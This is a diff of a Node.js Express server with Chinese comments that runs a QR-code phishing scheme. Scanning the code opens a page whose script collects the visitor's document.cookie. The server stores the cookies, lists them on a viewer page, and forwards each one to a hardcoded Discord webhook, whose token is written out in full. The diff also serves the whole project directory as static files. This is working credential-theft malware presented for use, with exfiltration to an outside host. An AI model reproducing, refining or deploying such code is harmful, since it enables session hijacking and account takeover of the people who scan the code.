@@ -4,41 +4,41 @@ const path = require("path");
 const app = express();
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "public")));
+app.use(express.static(__dirname));
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";
 
-// 内存存储
-const scans = {};     // scanId -> { status, cookie, createdAt }
-const cookies = [];  // [{ cookie, time }]
+const scans = {};
+const cookies = [];
 
-// ====== 页面路由 ======
+// ====== 首页 - 扫码页 ======
 app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "scan.html"));
+    res.sendFile(path.join(__dirname, "scan.html"));
 });
 
+// ====== Cookie查看页 ======
 app.get("/cookies", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "cookies.html"));
+    res.sendFile(path.join(__dirname, "cookies.html"));
 });
 
-// ====== 扫码链接 ======
+// ====== 扫码链接 - 用户扫了之后打开的页面 ======
 app.get("/s/:scanId", (req, res) => {
     const { scanId } = req.params;
     const scan = scans[scanId];
 
     if (!scan) {
-        return res.send("链接已过期或不存在");
+        return res.send("<h2>二维码已过期或不存在</h2>");
     }
 
     if (scan.status === "done") {
-        return res.send("该二维码已被使用");
+        return res.send("<h2>该二维码已被使用</h2>");
     }
 
-    // 通过js获取cookie然后提交
     res.send(`<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
+<p>正在获取...</p>
 <script>
 fetch("/api/submit", {
     method: "POST",
@@ -47,8 +47,10 @@ fetch("/api/submit", {
         scanId: "${scanId}",
         cookie: document.cookie
     })
-}).then(r => r.json()).then(data => {
-    document.body.innerHTML = data.ok ? "✅ 成功" : "❌ 失败";
+}).then(function(r) { return r.json(); }).then(function(data) {
+    document.body.innerHTML = data.ok ? "<h2>成功</h2>" : "<h2>失败</h2>";
+}).catch(function() {
+    document.body.innerHTML = "<h2>网络错误</h2>";
 });
 </script>
 </body>
@@ -58,7 +60,7 @@ fetch("/api/submit", {
 // ====== 生成二维码 ======
 app.get("/api/qr", (req, res) => {
     const scanId = uuidv4();
-    const scanUrl = `https://${req.get("host")}/s/${scanId}`;
+    const scanUrl = "https://" + req.get("host") + "/s/" + scanId;
 
     scans[scanId] = {
         status: "wait",
@@ -66,7 +68,7 @@ app.get("/api/qr", (req, res) => {
         createdAt: Date.now()
     };
 
-    res.json({ scanId, scanUrl });
+    res.json({ scanId: scanId, scanUrl: scanUrl });
 });
 
 // ====== 提交Cookie ======
@@ -75,16 +77,19 @@ app.post("/api/submit", (req, res) => {
     const scan = scans[scanId];
 
     if (!scan) {
-        return res.status(404).json({ ok: false, error: "scan not found" });
+        return res.status(404).json({ ok: false, error: "not found" });
+    }
+
+    if (!cookie || cookie.trim() === "") {
+        return res.json({ ok: false, error: "empty cookie" });
     }
 
     scan.status = "done";
     scan.cookie = cookie;
-    cookies.push({ cookie, time: new Date().toISOString() });
+    cookies.push({ cookie: cookie, time: new Date().toISOString() });
 
-    // 异步发到Discord（不阻塞响应）
     sendToDiscord(cookie);
-    
+
     res.json({ ok: true });
 });
 
@@ -94,7 +99,7 @@ app.get("/api/check", (req, res) => {
     const scan = scans[id];
 
     if (!scan) {
-        return res.json({ status: "expired" });
+        return res.json({ status: "expired", cookie: null });
     }
 
     res.json({ status: scan.status, cookie: scan.cookie });
@@ -105,20 +110,31 @@ app.get("/api/cookies", (req, res) => {
     res.json(cookies.slice(-50).reverse());
 });
 
-// ====== 发送Discord ======
-async function sendToDiscord(cookie) {
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: `**新Cookie**\n\`\`\`\n${cookie}\n\`\`\``
-            })
-        });
-    } catch (e) {
-        console.error("Discord发送失败:", e.message);
-    }
+// ====== 发送到Discord ======
+function sendToDiscord(cookie) {
+    const https = require("https");
+    const url = new URL(WEBHOOK_URL);
+
+    const data = JSON.stringify({
+        content: "**新Cookie**\n```\n" + cookie + "\n```"
+    });
+
+    const options = {
+        hostname: url.hostname,
+        path: url.pathname + url.search,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Content-Length": Buffer.byteLength(data)
+        }
+    };
+
+    const req = https.request(options);
+    req.write(data);
+    req.end();
 }
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`运行在端口 ${PORT}`));
+app.listen(PORT, function() {
+    console.log("运行在端口 " + PORT);
+});
